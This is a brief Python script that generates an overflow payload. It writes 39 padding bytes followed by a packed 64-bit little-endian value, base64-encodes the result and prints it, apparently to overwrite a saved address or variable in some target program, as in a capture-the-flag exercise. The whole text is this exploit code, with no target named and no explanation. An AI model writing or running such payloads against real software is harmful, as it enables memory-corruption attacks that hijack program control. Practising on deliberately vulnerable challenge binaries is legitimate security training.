
import sys
import struct
import base64

buf = b'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'
buf += struct.pack('<Q', 11388738209200203079)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
